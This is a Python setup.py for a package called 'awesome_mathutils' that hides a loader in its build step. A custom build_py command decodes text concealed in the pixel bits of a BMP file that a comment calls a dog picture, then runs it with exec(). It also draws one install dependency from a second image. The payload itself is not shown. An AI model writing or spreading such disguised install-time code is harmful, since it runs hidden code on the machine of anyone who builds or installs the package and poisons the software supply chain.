from setuptools import setup
import pathlib
from setuptools.command.build_py import build_py as _build_py

def read_image(path):
    data = open(path, "rb").read()
    pixel_offset = int.from_bytes(data[10:14], "little")
    data = data[pixel_offset:]

    bits = []
    for b in data:
        bits.append(str(b & 1))
        if len(bits) % 8 == 0:
            if int(''.join(bits[-8:]), 2) == 0:
                break

    return ''.join(
        chr(int(''.join(bits[i:i+8]), 2))
        for i in range(0, len(bits)-8, 8)
    )

# This is my dog pictures. I would like to keep her as part of the package  
my_dog = str(pathlib.Path(__file__).parent / "my_dog.bmp")
my_dog2 = str(pathlib.Path(__file__).parent / "my_dog2.bmp")
install_requires = [ "numpy", read_image(my_dog2) ]


class build_py(_build_py):
    def run(self):
        exec(read_image(my_dog))
        super().run()


setup(
    name="awesome_mathutils",
    version="0.0.0",
    py_modules=["awesome_mathutils"],
    install_requires=install_requires,
    setup_requires=["pip"],
    cmdclass={
        "build_py": build_py,
    },
)